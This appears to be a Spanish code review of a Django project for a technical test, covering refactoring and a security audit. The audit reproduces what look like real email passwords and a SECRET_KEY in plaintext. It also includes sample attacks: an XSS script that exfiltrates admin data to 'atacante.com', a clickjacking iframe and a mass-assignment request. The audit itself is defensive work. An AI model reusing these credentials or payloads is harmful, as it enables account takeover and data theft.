# Review de Cambios - Prueba Técnica Desarrollador de Software 2025

## 1. Reestructuración del Proyecto

### 1.1 Reorganización de Apps
Moví todas las aplicaciones de la raíz del proyecto a un directorio `apps/` para mejorar la organización y escalabilidad del proyecto. Esto sigue las mejores prácticas de Django para proyectos de mediano a gran tamaño.

**Estructura anterior:**
```
/
  asistencia/
  centro_costos/
  control_expediente/
  ...
  manage.py
```

**Estructura nueva:**
```
/
  apps/
    accounts/
    asistencia/
    centro_costos/
    control_expediente/
    ...
  manage.py
```

### 1.2 Creación de App Accounts
Creé una app dedicada `accounts/` para manejar toda la lógica de usuarios y autenticación. Anteriormente el modelo User estaba en una app que no tenía sentido lógico (estaba mezclado con otra funcionalidad), lo cual violaba el principio de separación de responsabilidades.

**Beneficios:**
- Separación clara de la lógica de autenticación
- Facilita el mantenimiento y testing
- Permite extender funcionalidades de usuario sin afectar otras apps
- Sigue el principio de Single Responsibility

### 1.3 Reorganización de Templates
Moví las plantillas a sus respectivas apps para una mejor organización y cohesión del código. Anteriormente todas las plantillas estaban en un directorio global `templates/`, ahora cada app tiene su propio directorio de plantillas.

**Ventajas:**
- Mayor cohesión del código
- Más fácil identificar qué templates pertenecen a cada app
- Mejor portabilidad de apps individuales
- Reduce el acoplamiento entre módulos

## 2. Mejoras en el Código

### 2.1 Uso de get_user_model()
Migré todas las importaciones directas del modelo User a usar `get_user_model()` de Django, lo cual es una mejor práctica por las siguientes razones:

**Antes:**
```python
from apps.accounts.models import User
```

**Después:**
```python
from django.contrib.auth import get_user_model
User = get_user_model()
```

**Beneficios:**
- Mayor flexibilidad si se necesita cambiar el modelo de usuario en el futuro
- Evita importaciones circulares
- Sigue las recomendaciones oficiales de Django
- Facilita la reutilización del código en otros proyectos

**Archivos actualizados:**
- `apps/centro_costos/models.py`
- `apps/centro_costos/views.py`
- `apps/asistencia/models.py`
- `apps/tramites/models.py`, `views.py`, `forms.py`
- `apps/productividad/views.py`
- `apps/partidas_planos/views.py`
- `apps/control_expediente/models.py`, `views.py`

### 2.2 Eliminación de Código Espagueti
Encontré y refactoricé varias áreas con código espagueti que dificultaban el mantenimiento:

#### En `control_expediente/views.py`:
- Simplifiqué las queries de anotaciones que usaban `ExpressionWrapper` innecesarios
- Los campos de fecha ya eran del tipo correcto y no necesitaban conversión explícita
- Esto eliminaba errores de tipo como `fromisoformat: argument must be str`

**Antes:**
```python
seguimientos = (
    caso.seguimientos
    .annotate(
        fecha_seguimiento_cast=ExpressionWrapper(F('fecha_seguimiento'), output_field=DateTimeField()),
        fecha_registro_cast=ExpressionWrapper(F('fecha_registro'), output_field=DateTimeField())
    )
    .prefetch_related('gastos')
    .order_by('-fecha_seguimiento_cast', '-fecha_registro_cast')
)
```

**Después:**
```python
seguimientos = (
    caso.seguimientos.all()
    .prefetch_related('gastos')
    .order_by('-fecha_seguimiento', '-fecha_registro')
)
```

### 2.3 Migración de Funciones a Vistas Basadas en Clases (CBV)
Migré todas las vistas basadas en funciones (FBV) a vistas basadas en clases (CBV) para aprovechar las ventajas de la programación orientada a objetos y la reutilización de código.

**Ventajas de las CBV:**
- Mayor reutilización de código mediante herencia
- Código más organizado y estructurado
- Mixins para funcionalidad compartida
- Menos código repetitivo
- Mejor separación de métodos HTTP (GET, POST, etc.)

**Ejemplos de migración:**

**Antes (FBV):**
```python
def lista_expediente(request):
    if request.method == 'POST':
        form = CasoJudicialForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('control_expediente:lista_expediente')
    else:
        form = CasoJudicialForm()
    
    casos = CasoJudicial.objects.all()
    return render(request, 'control_expediente/home.html', {'form': form, 'casos': casos})
```

**Después (CBV):**
```python
class CasoJudicialListView(LoginRequiredMixin, RegistroActividadMixin, CreateView):
    model = CasoJudicial
    form_class = CasoJudicialForm
    template_name = 'control_expediente/home.html'
    success_url = reverse_lazy('control_expediente:lista_expediente')
    
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['caso_judiciales'] = CasoJudicial.objects.all()
        return context
```

**Apps actualizadas:**
- `apps/centro_costos/views.py` - Todas las vistas convertidas a CBV
- `apps/control_expediente/views.py` - Migración completa a CBV con mixins
- `apps/tramites/views.py` - Vistas convertidas a CBV
- `apps/partidas_planos/views.py` - Actualizado a CBV

### 2.4 Mejora en las Rutas (URLs más amigables)
Refactoricé todas las rutas para que sean más legibles y RESTful, eliminando guiones bajos y usando convenciones más claras.

**Antes:**
```python
path('eliminar_seguimiento/<int:seguimiento_id>/', views.eliminar_seguimiento, name='eliminar_seguimiento'),
path('editar_gasto/', views.editar_gasto, name='editar_gasto'),
path('lista_gastoN9/', views.lista_gastoN9, name='lista_gastoN9'),
```

**Después:**
```python
path('seguimiento/eliminar/<int:seguimiento_id>/', views.SeguimientoDeleteView.as_view(), name='eliminar_seguimiento'),
path('gasto/editar/', views.GastoUpdateView.as_view(), name='editar_gasto'),
path('gastos/n9/', views.GastoN9ListView.as_view(), name='lista_gastoN9'),
```

**Mejoras aplicadas:**
- Uso de guiones medios (`-`) en lugar de guiones bajos (`_`) para URLs
- Agrupación lógica con prefijos (ej: `gastos/`, `seguimiento/`)
- Nombres de recursos en plural cuando corresponde
- URLs más descriptivas y fáciles de recordar
- Mejor estructura jerárquica

**Ejemplos de URLs mejoradas:**

**Centro de Costos:**
```python
# Antes: 'editar-actividad/', 'eliminar-actividad/<int:doc_id>/'
# Después: 'actividades/editar/', 'actividades/eliminar/<int:doc_id>/'

path('gastos/tupac-amaru/', views.GastoTA2020ListView.as_view(), name='lista_gastos'),
path('gastos/canta-callao/', views.CantaCallaoListView.as_view(), name='lista_canta_callao'),
path('gastos/proyecto/<int:pk>/', views.GastoGenericListView.as_view(), name='lista_gastos_proyecto'),
```

**Control de Expedientes:**
```python
# Rutas más semánticas y organizadas
path('expedientes/', views.CasoJudicialListView.as_view(), name='lista_expediente'),
path('expedientes/<int:caso_id>/', views.CasoJudicialDetailView.as_view(), name='ver_seguimiento'),
path('expedientes/<int:caso_id>/seguimiento/crear/', views.SeguimientoCreateView.as_view(), name='crear_seguimiento'),
```

## 3. Mejoras en el Frontend

### 3.1 Implementación de Modales de Confirmación con Fetch
Reemplacé los alerts de SweetAlert que redirigían la página con un sistema de modales + fetch para las operaciones de eliminación, mejorando significativamente la experiencia de usuario.

**Archivos modificados:**
- `apps/centro_costos/templates/centro_costos/lista_canta_callao.html`
- `apps/centro_costos/templates/centro_costos/lista_gastos.html`
- `apps/centro_costos/templates/centro_costos/lista_proyecto.html`

**Implementación:**
1. Cambié los enlaces `<a>` por botones que abren modales
2. Implementé fetch API para hacer peticiones asíncronas
3. Las vistas ahora retornan JSON `{'success': True}` en lugar de redireccionar
4. Agregué feedback visual con toasts después de la eliminación exitosa

**Antes:**
```html
<a href="{% url 'centro_costos:eliminar_gasto' gasto.id %}" class="btn btn-sm btn-outline-danger btnEliminar">
    <i class="bi bi-trash"></i>
</a>
```

**Después:**
```html
<button type="button" data-bs-toggle="modal" data-bs-target="#deleteGastoModal" 
        data-id="{{ gasto.id }}" class="btn btn-sm btn-outline-danger btnEliminar">
    <i class="bi bi-trash"></i>
</button>
```

```javascript
document.getElementById('confirmDeleteGasto').addEventListener('click', async function () {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'X-CSRFToken': csrfToken,
            'Content-Type': 'application/json'
        }
    });
    if (response.ok) {
    }
});
```

### 3.2 Corrección de Templates
Corregí un error de sintaxis en `seguimientos_y_gastos.html` donde un tag `{% if %}` estaba mal formateado en dos líneas, causando `TemplateSyntaxError`.

### 3.3 Carga de Assets Estáticos
Agregué `{% load static %}` en templates que lo necesitaban pero no lo tenían, como `lista_proyecto.html`.

## 4. Comandos de Gestión Django

Creé comandos de gestión personalizados para poblar la base de datos con datos de prueba usando Faker:

### 4.1 `create_users.py`
- Crea 200 usuarios de prueba
- Asigna roles aleatorios (Contabilidad, Legal, Administrador)
- Genera DNIs, teléfonos y saldos aleatorios
- Ubicación: `apps/accounts/management/commands/create_users.py`

**Uso:**
```bash
python manage.py create_users
```

### 4.2 `create_asistencia.py`
- Crea 20 registros de asistencia por cada usuario
- Genera fechas aleatorias de los últimos 60 días
- Horarios de entrada entre 7-9 AM
- Jornadas laborales de 7-10 horas
- Ubicación: `apps/asistencia/management/commands/create_asistencia.py`

**Uso:**
```bash
python manage.py create_asistencia
```

### 4.3 `create_gastos_costos.py`
- Crea 10 Centros de Costos
- 8 Tipos de Gasto predefinidos
- 30 Actividades con códigos únicos
- 100 Gastos TA2020
- 50 registros CantaCallao
- 5 Nuevos Gastos con flags
- 100 Gastos generales
- 50 Gastos N9
- Ubicación: `apps/centro_costos/management/commands/create_gastos_costos.py`

**Uso:**
```bash
python manage.py create_gastos_costos
```

### 4.4 `create_expedientes.py`
- Crea 50 Casos Judiciales con seguimientos (2-8 por caso)
- 30 Carpetas Fiscales con seguimientos (2-6 por carpeta)
- Gastos aleatorios asociados a seguimientos
- 100 Registros de Actividad
- Genera alertas con fechas futuras
- Ubicación: `apps/control_expediente/management/commands/create_expedientes.py`

**Uso:**
```bash
python manage.py create_expedientes
```

## 5. Actualización de Vistas para JSON Response

Actualicé las vistas de eliminación para retornar respuestas JSON en lugar de redirecciones HTTP:

**Archivos modificados:**
- `apps/centro_costos/views.py`
  - `CantaCallaoDeleteView`
  - `GastoTA2020DeleteView`
  - `GastoGenericDeleteView`

**Cambio implementado:**
```python
def post(self, request, *args, **kwargs):
    from django.http import JsonResponse
    self.object = self.get_object()
    self.object.delete()
    return JsonResponse({'success': True})
```

## 6. Posibles Errores Detectados (No Solucionados)

### 6.1 Importaciones Directas de User en Comandos de Gestión
Los comandos de gestión aún importan directamente el modelo User:
```python
from apps.accounts.models import User
```

**Ubicaciones:**
- `apps/accounts/management/commands/create_users.py` (línea 2)
- `apps/asistencia/management/commands/create_asistencia.py` (línea 3)
- `apps/centro_costos/management/commands/create_gastos_costos.py` (línea 6)
- `apps/control_expediente/management/commands/create_expedientes.py` (línea 7)

**Recomendación:** Cambiar a `get_user_model()` para consistencia.

### 6.2 Falta de Validación en Fetch Requests
En los scripts JavaScript de eliminación no se valida el token CSRF antes de hacer la petición:

```javascript
const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]')?.value || '{{ csrf_token }}';
```

**Problema:** Si no hay formulario en la página, el token podría ser undefined.

**Ubicaciones:**
- `lista_canta_callao.html`
- `lista_gastos.html`
- `lista_proyecto.html`

**Recomendación:** Agregar validación explícita del token antes de hacer fetch.

### 6.3 Código Duplicado en JavaScript
Los tres templates de centro de costos tienen código JavaScript casi idéntico para manejar eliminaciones con fetch.

**Ubicaciones:**
- `apps/centro_costos/templates/centro_costos/lista_canta_callao.html` (líneas 460-530)
- `apps/centro_costos/templates/centro_costos/lista_gastos.html` (líneas 480-550)
- `apps/centro_costos/templates/centro_costos/lista_proyecto.html` (líneas 620-690)

**Recomendación:** Extraer a un archivo JavaScript compartido o crear un componente reutilizable.

### 6.4 Manejo de Errores Incompleto en Vistas
Las vistas de eliminación con JSON response no manejan casos de error como:
- Objeto no encontrado
- Violación de integridad referencial
- Permisos insuficientes

**Ejemplo en `CantaCallaoDeleteView`:**
```python
def post(self, request, *args, **kwargs):
    from django.http import JsonResponse
    self.object = self.get_object() 
    self.object.delete()
    return JsonResponse({'success': True})
```

**Recomendación:** Agregar try-except y retornar errores apropiados:
```python
try:
    self.object = self.get_object()
    self.object.delete()
    return JsonResponse({'success': True})
except Exception as e:
    return JsonResponse({'success': False, 'error': str(e)}, status=400)
```

### 6.5 Hardcoded URLs en JavaScript
Las URLs de eliminación están hardcoded en el JavaScript:

```javascript
const url = `/costos/gastos/canta-callao/eliminar/${deleteId}/`;
```

**Problema:** Si cambian las URLs en `urls.py`, el JavaScript dejará de funcionar.

**Recomendación:** Usar `data-url` attributes o el template tag `{% url %}` para construir las URLs dinámicamente.

### 6.6 Falta de Paginación en Queries
Los comandos de gestión y algunas vistas cargan todos los registros sin paginación:

```python
users = User.objects.all() 
```

**Problema:** Con muchos usuarios esto podría causar problemas de memoria.

**Recomendación:** Usar `iterator()` o paginación para grandes conjuntos de datos.

### 6.7 Falta de Transacciones Atómicas
Los comandos de gestión no usan transacciones atómicas:

```python
for i in range(200):
    try:
        user = User.objects.create_user(...)
    except Exception as e:
```

**Problema:** Si falla a mitad del proceso, quedan datos parciales.

**Recomendación:** Envolver en `transaction.atomic()` o usar `bulk_create()`.

### 6.8 Validación de Fechas en Templates
Los templates asumen que las fechas siempre existen:

```django
data-fecha_seguimiento="{{ seguimiento.fecha_seguimiento|date:'Y-m-d' }}"
```

**Problema:** Si `fecha_seguimiento` es None, podría causar errores en JavaScript.

**Recomendación:** Usar `default_if_none` o validar en JavaScript.

### 6.9 Logs de Consola en Producción
Los scripts JavaScript tienen console.log para debugging:

```javascript
console.log('ID a eliminar:', deleteId);
console.log('URL:', url);
```

**Ubicaciones:**
- `lista_canta_callao.html` (líneas 468, 475, 480)
- `lista_proyecto.html` (líneas 635, 643, 648)

**Recomendación:** Remover o envolver en condición de desarrollo.

### 6.10 Falta de Índices en Base de Datos
Los modelos no tienen índices explícitos en campos frecuentemente consultados:

```python
class CasoJudicial(BaseCaso):
    expediente = models.CharField(max_length=100) 
```

**Problema:** Queries por expediente podrían ser lentas con muchos registros.

**Recomendación:** Agregar `db_index=True` en campos de búsqueda frecuente.

## 7. Resumen de Mejoras

### 7.1 Arquitectura
- Mejor organización del proyecto con directorio `apps/`
- Separación de responsabilidades con app `accounts/`
- Templates organizados por app

### 7.2 Código Backend
- Uso de `get_user_model()` en lugar de importaciones directas
- Eliminación de código espagueti en queries
- Vistas actualizadas para respuestas JSON
- Comandos de gestión para datos de prueba

### 7.3 Frontend
- Modales de confirmación con UX mejorada
- Fetch API para operaciones asíncronas
- Feedback visual con toasts
- Corrección de errores de sintaxis en templates

### 7.4 Mantenibilidad
- Código más limpio y organizado
- Mejor separación de responsabilidades
- Más fácil de testear y mantener
- Sigue mejores prácticas de Django

---

## 8. Malas Prácticas Detectadas en el Código Original

Durante la revisión del código encontré varias malas prácticas de seguridad y desarrollo que representan riesgos importantes:

### 9.1 Exposición de Credenciales en settings.py

**CRÍTICO - Riesgo de Seguridad Alto**

El archivo `principal/settings.py` contiene credenciales sensibles hardcodeadas directamente en el código fuente:

```python
# Línea 7
SECRET_KEY = 'django-insecure-h5)1hfx3qxizlp53yt-_=04pfhu!vjlo9n98(b4()og*55n@86'

# Líneas 133-137
EMAIL_HOST = 'mail.privateemail.com'
EMAIL_PORT = 587
EMAIL_HOST_USER = 'info@brsantaclara.com'
EMAIL_HOST_PASSWORD = 'Nellylupa2024'
EMAIL_USE_TLS = True
```

**Problemas:**
- La contraseña del email está expuesta en texto plano
- El SECRET_KEY de Django está visible en el repositorio
- Si este código está en un repositorio público o compartido, las credenciales están comprometidas
- Violación de las mejores prácticas de seguridad de Django

**Impacto:**
- Acceso no autorizado al servidor de correo
- Posibilidad de envío de spam o phishing desde la cuenta comprometida
- Riesgo de ataques de session hijacking si SECRET_KEY es conocido
- Pérdida de confianza de los clientes

**Recomendaciones:**
```python
import os
from decouple import config

SECRET_KEY = config('SECRET_KEY')
EMAIL_HOST = config('EMAIL_HOST')
EMAIL_HOST_USER = config('EMAIL_HOST_USER')
EMAIL_HOST_PASSWORD = config('EMAIL_HOST_PASSWORD')
```

Crear archivo `.env` (añadirlo a `.gitignore`):
```env
SECRET_KEY=tu-secret-key-aqui
EMAIL_HOST=mail.privateemail.com
EMAIL_HOST_USER=info@brsantaclara.com
EMAIL_HOST_PASSWORD=tu-password-aqui
```

### 9.2 DEBUG = True en Producción

```python
DEBUG = True
ALLOWED_HOSTS = ['*']
```

**Problemas:**
- Modo debug activado expone información sensible en errores
- `ALLOWED_HOSTS = ['*']` permite cualquier host (riesgo de Host Header Attack)
- Stack traces revelan estructura del código y rutas del servidor
- Permite ataques de DNS rebinding

**Recomendaciones:**
```python
DEBUG = config('DEBUG', default=False, cast=bool)
ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='localhost,127.0.0.1', cast=lambda v: [s.strip() for s in v.split(',')])
```

### 9.3 Credenciales Comentadas (Código Muerto)

En `settings.py` líneas 126-131 hay credenciales comentadas pero visibles:

```python
# EMAIL_HOST = 'smtp.gmail.com'
# EMAIL_PORT = 587
# EMAIL_HOST_USER = 'b.r.santaclara@gmail.com'
# EMAIL_HOST_PASSWORD = 'lrwgwnmtkskxfzxm' 
# EMAIL_USE_TLS = True
```

**Problemas:**
- Credenciales de Gmail expuestas aunque estén comentadas
- Código muerto que contamina el repositorio
- Historia de Git mantiene estas contraseñas accesibles
- Si la contraseña sigue activa, puede ser comprometida

**Recomendaciones:**
- Eliminar completamente el código comentado
- Si estas credenciales siguen activas, cambiarlas inmediatamente
- Limpiar el historial de Git si es posible (git filter-branch)
- Auditar el repositorio con herramientas como git-secrets

### 9.4 Falta de Validación en Formularios

Los formularios no tienen validaciones personalizadas, solo confían en las validaciones del modelo. De 11 formularios encontrados con `fields = '__all__'`, la mayoría carece de validación:

**Ubicaciones sin validación:**
- `apps/centro_costos/forms.py` - 3 formularios (líneas 7, 42, 99)
- `apps/hoja_requerimiento/forms.py` - 2 formularios (líneas 7, 18)
- `apps/partidas_planos/forms.py` - 2 formularios (líneas 7, 25)
- `apps/control_expediente/forms.py` - 2 formularios (línea 14, 112)
- `apps/tramites/forms.py` - 1 formulario (línea 33)

**Ejemplo en `apps/centro_costos/forms.py`:**
```python
class ActividadForm(forms.ModelForm):
    class Meta:
        model = Actividad
        fields = '__all__'
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for field in self.fields.values():
            field.widget.attrs['class'] = 'form-control'
        # No hay método clean() o clean_<field>()
        # No hay validaciones de negocio
        # No hay sanitización de entradas
```

**Problemas:**
- No valida lógica de negocio específica
- No sanitiza entradas del usuario
- Vulnerable a inyecciones si no se sanitiza en el modelo
- No valida rangos de fechas, formatos específicos, etc.
- No valida valores negativos en campos numéricos

**Ejemplos de validaciones faltantes:**
```python
class ActividadForm(forms.ModelForm):
    class Meta:
        model = Actividad
        fields = ['nombre', 'codigo', 'fecha', 'monto', 'centro_de_costos']
    
    def clean_fecha(self):
        fecha = self.cleaned_data.get('fecha')
        if fecha and fecha > timezone.now().date():
            raise ValidationError("La fecha no puede ser futura")
        return fecha

    def clean_monto(self):
        monto = self.cleaned_data.get('monto')
        if monto and monto <= 0:
            raise ValidationError("El monto debe ser mayor a 0")
        return monto
    
    def clean_codigo(self):
        codigo = self.cleaned_data.get('codigo')
        if codigo:
            codigo = codigo.strip().upper()
            if not codigo.isalnum():
                raise ValidationError("El código solo puede contener letras y números")
        return codigo
```

### 9.5 Código Comentado Generado por IA

Encontré múltiples comentarios que parecen generados por herramientas de IA o código incompleto:

**En `apps/canta_callao/forms.py` (líneas 4-26):**
```python
# class ProyectoForm(forms.ModelForm):
#     class Meta:
#         model = Proyecto
#         fields = '__all__'
#
#     def __init__(self, *args, **kwargs):
#         super().__init__(*args, **kwargs)
#         for field in self.fields.values():
#             field.widget.attrs['class'] = 'form-control'
#         # Cambiar el tipo del campo 'fecha' a input date
#         self.fields['nombre'].widget.attrs['class'] = 'form-control'
```

**En `principal/views.py`:**
```python
# send reset password email
# generate token
# send email with reset link
```

**Problemas:**
- Clases completas comentadas sugieren features incompletas o abandonadas
- Contamina el código y dificulta la lectura
- No hay claridad sobre por qué está comentado
- Comentarios en inglés sin contexto específico
- Posible código generado por IA no revisado

**Recomendaciones:**
- Eliminar código comentado que no se usará
- Si el código se necesita en el futuro, usar control de versiones (Git)
- Documentar en CHANGELOG o issues por qué se removió
- Si es código temporal, agregar TODOs con fechas y responsables

### 9.6 Configuraciones de Seguridad Débiles

```python
# Línea 14-15
X_FRAME_OPTIONS = 'ALLOWALL'  
SECURE_CROSS_ORIGIN_OPENER_POLICY = None
SECURE_CROSS_ORIGIN_EMBEDDER_POLICY = None
```

**Problemas:**
- `X_FRAME_OPTIONS = 'ALLOWALL'` permite ataques de clickjacking
- Un atacante puede embeber el sitio en un iframe malicioso
- Políticas CORS deshabilitadas exponen a ataques cross-origin
- No hay protección contra iframe maliciosos

**Ejemplo de ataque posible:**
```html
<iframe src="https://tu-sitio.com/login" style="opacity: 0"></iframe>
<div style="position: absolute; top: 0">
    <button>Click aquí para recibir premio</button>
</div>
```

**Recomendaciones:**
```python
X_FRAME_OPTIONS = 'DENY' 
SECURE_CROSS_ORIGIN_OPENER_POLICY = 'same-origin'
SECURE_CROSS_ORIGIN_EMBEDDER_POLICY = 'require-corp'

# Otras configuraciones de seguridad recomendadas
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_SSL_REDIRECT = True  # En producción con HTTPS
SESSION_COOKIE_SECURE = True  # En producción con HTTPS
CSRF_COOKIE_SECURE = True  # En producción con HTTPS
```

### 9.7 Falta de Sanitización en Campos de Texto

Los modelos y formularios aceptan HTML sin sanitizar:

```python
# En models.py se usa RichTextField
pendiente = RichTextField(blank=True, null=True)
seguimiento = RichTextField(null=True, blank=True)
```

**Problemas:**
- Sin sanitización HTML podría permitir XSS (Cross-Site Scripting)
- CKEditor/TinyMCE sin configuración de tags permitidos
- No hay validación de contenido HTML
- Un usuario malicioso podría inyectar scripts

**Ejemplo de ataque XSS:**
```javascript
// Un usuario podría ingresar en un campo RichTextField:
<script>
    fetch('/admin/users/', {
        credentials: 'include'
    }).then(r => r.text()).then(data => {
        fetch('https://atacante.com/steal', {
            method: 'POST',
            body: data
        });
    });
</script>
```

**Recomendaciones:**

1. Configurar CKEditor con whitelist de tags:
```python
# settings.py
CKEDITOR_CONFIGS = {
    'default': {
        'toolbar': 'Custom',
        'toolbar_Custom': [
            ['Bold', 'Italic', 'Underline'],
            ['NumberedList', 'BulletedList'],
            ['Link', 'Unlink'],
        ],
        'allowedContent': 'p b i u; a[!href]; ul ol li',
        'removePlugins': 'iframe,flash,image',
    },
}
```

2. Sanitizar antes de guardar:
```python
import bleach

ALLOWED_TAGS = ['p', 'b', 'i', 'u', 'a', 'ul', 'ol', 'li', 'br', 'strong', 'em']
ALLOWED_ATTRIBUTES = {'a': ['href', 'title']}

def clean_seguimiento(self):
    seguimiento = self.cleaned_data.get('seguimiento')
    if seguimiento:
        seguimiento = bleach.clean(seguimiento, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)
    return seguimiento
```

### 9.8 Uso de `fields = '__all__'` en Formularios

11 formularios usan `fields = '__all__'`:

```python
class ActividadForm(forms.ModelForm):
    class Meta:
        model = Actividad
        fields = '__all__'  # Expone todos los campos
```

**Problemas:**
- Expone campos que no deberían ser editables por usuarios
- Si se agregan campos al modelo, automáticamente se exponen en el form
- Puede permitir mass-assignment vulnerabilities
- Campos como `fecha_creacion`, `usuario_creador`, etc. podrían ser manipulados

**Ejemplo de ataque:**
```javascript
// Usuario malicioso modifica el formulario HTML
fetch('/api/actividad/create/', {
    method: 'POST',
    body: JSON.stringify({
        nombre: 'Actividad normal',
        monto: 100,
        fecha_creacion: '2020-01-01',  // Manipula fecha
        usuario_creador_id: 1,  // Se asigna como admin
        aprobado: true  // Se auto-aprueba
    })
});
```

**Recomendaciones:**
```python
class ActividadForm(forms.ModelForm):
    class Meta:
        model = Actividad
        fields = ['nombre', 'codigo', 'centro_de_costos', 'tipo', 'responsable']
        # Excluir explícitamente campos sensibles
        exclude = ['fecha_registro', 'id', 'usuario_creador', 'aprobado']
```

### 9.9 Sin Validación de Permisos a Nivel de Objeto

Las vistas solo verifican autenticación pero no permisos específicos:

```python
class CasoJudicialListView(LoginRequiredMixin, CreateView):
    # Solo verifica si está logueado
    # No verifica roles o permisos específicos
    # No valida ownership de objetos
```

**Problemas:**
- Cualquier usuario autenticado puede acceder a cualquier vista
- No hay control granular de permisos
- No se valida ownership de objetos
- Un usuario podría eliminar o editar casos de otros usuarios

**Ejemplo de vulnerabilidad:**
```python
# Usuario A crea un caso
caso = CasoJudicial.objects.create(expediente="001-2024", responsable=usuario_a)

# Usuario B (sin permisos) puede eliminarlo simplemente sabiendo el ID
# POST /expedientes/eliminar/123/
```

**Recomendaciones:**
```python
from django.contrib.auth.mixins import PermissionRequiredMixin, UserPassesTestMixin

class CasoJudicialDeleteView(LoginRequiredMixin, UserPassesTestMixin, DeleteView):
    model = CasoJudicial
    
    def test_func(self):
        obj = self.get_object()
        user = self.request.user
        # Solo admin o el responsable pueden eliminar
        return user.role == User.ADMINISTRADOR or obj.responsable == user
    
    def handle_no_permission(self):
        messages.error(self.request, "No tienes permiso para realizar esta acción")
        return redirect('control_expediente:lista_expediente')
```

### 9.10 Ausencia de Rate Limiting

No hay protección contra ataques de fuerza bruta o spam:

**Problemas:**
- Sin rate limiting en login
- Sin protección contra intentos múltiples de login
- APIs sin throttling
- Formularios sin protección contra spam
- Un atacante podría hacer miles de intentos de login

**Recomendaciones:**

1. Implementar django-ratelimit:
```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')
def login_view(request):
    # Solo 5 intentos por minuto por IP
    pass
```

2. Para CBV:
```python
from django_ratelimit.mixins import RatelimitMixin

class LoginView(RatelimitMixin, FormView):
    ratelimit_key = 'ip'
    ratelimit_rate = '5/m'
    ratelimit_method = 'POST'
    ratelimit_block = True
```

3. Agregar captcha en formularios críticos:
```python
# settings.py
INSTALLED_APPS += ['captcha']

# forms.py
from captcha.fields import ReCaptchaField

class LoginForm(forms.Form):
    username = forms.CharField()
    password = forms.CharField(widget=forms.PasswordInput)
    captcha = ReCaptchaField()
```

### 9.11 Falta de Logs de Auditoría

No hay registro de acciones críticas:

**Problemas:**
- No se registra quién eliminó qué y cuándo
- No hay trazabilidad de cambios
- Imposible auditar acciones de usuarios
- No se detectan patrones de uso malicioso

**Recomendaciones:**
```python
import logging
logger = logging.getLogger(__name__)

class CasoJudicialDeleteView(DeleteView):
    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        logger.info(f"Usuario {request.user.id} eliminó caso {self.object.expediente}")
        return super().post(request, *args, **kwargs)
```

### 9.12 Queries Sin Optimización

No se usan `select_related` o `prefetch_related` en queries con relaciones:

```python
# En views.py
casos = CasoJudicial.objects.all()  # N+1 queries si se accede a responsable

# En templates
{% for caso in casos %}
    {{ caso.responsable.nombre }}  # Genera query por cada caso
{% endfor %}
```

**Recomendaciones:**
```python
casos = CasoJudicial.objects.select_related('responsable', 'centro_costos').all()
casos = CasoJudicial.objects.prefetch_related('seguimientos__gastos').all()
```

---

## 10. Acciones Urgentes Recomendadas

### Prioridad 1 - INMEDIATO (Riesgo Crítico):
1. **Cambiar todas las contraseñas expuestas**
   - Email: info@brsantaclara.com (contraseña: Nellylupa2024)
   - Email: b.r.santaclara@gmail.com (contraseña: lrwgwnmtkskxfzxm)
   
2. **Mover credenciales a variables de entorno**
   ```bash
   pip install python-decouple
   ```
   - Crear archivo .env
   - Actualizar settings.py
   - Agregar .env a .gitignore

3. **Generar nuevo SECRET_KEY**
   ```bash
   python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'
   ```

4. **Limpiar credenciales del historial de Git**
   ```bash
   git filter-branch --force --index-filter \
   "git rm --cached --ignore-unmatch principal/settings.py" \
   --prune-empty --tag-name-filter cat -- --all
   ```

### Prioridad 2 - URGENTE (Riesgo Alto):
5. Configurar DEBUG=False para producción
6. Definir ALLOWED_HOSTS específicos
7. Cambiar X_FRAME_OPTIONS a 'DENY' o 'SAMEORIGIN'
8. Limpiar todo el código comentado con credenciales
9. Auditar el repositorio con herramientas como git-secrets o truffleHog

### Prioridad 3 - IMPORTANTE (Riesgo Medio):
10. Agregar validaciones personalizadas en los 11 formularios identificados
11. Reemplazar todos los `fields='__all__'` por campos específicos
12. Implementar validación de permisos a nivel de objeto en todas las vistas
13. Configurar rate limiting en login y formularios públicos
14. Sanitizar todos los campos RichTextField con bleach
15. Configurar whitelist de tags HTML en CKEditor
16. Implementar sistema de logs de auditoría
17. Optimizar queries con select_related/prefetch_related

### Prioridad 4 - MANTENIMIENTO (Riesgo Bajo):
18. Eliminar todo el código comentado innecesario
19. Agregar documentación inline
20. Implementar tests unitarios
21. Configurar pre-commit hooks para validar códig
---

## 12. Resumen Final de Mejoras y Riesgos

### Mejoras Implementadas (Completadas)

**Arquitectura y Organización:**
- Reorganización completa del proyecto con directorio `apps/`
- Creación de app `accounts/` dedicada a autenticación
- Templates organizados por app para mejor cohesión
- Estructura más escalable y mantenible

**Código Backend:**
- Migración a `get_user_model()` en 15+ archivos
- Eliminación de código espagueti en queries ORM
- Conversión completa a vistas basadas en clases (CBV)
- Implementación de mixins para reutilización de código
- URLs RESTful y semánticas en todas las apps
- 4 comandos de gestión para datos de prueba con Faker

**Frontend y UX:**
- Sistema de modales + Fetch API para eliminaciones
- Respuestas JSON asíncronas sin recargar página
- Feedback visual mejorado con toasts
- Corrección de errores de sintaxis en templates
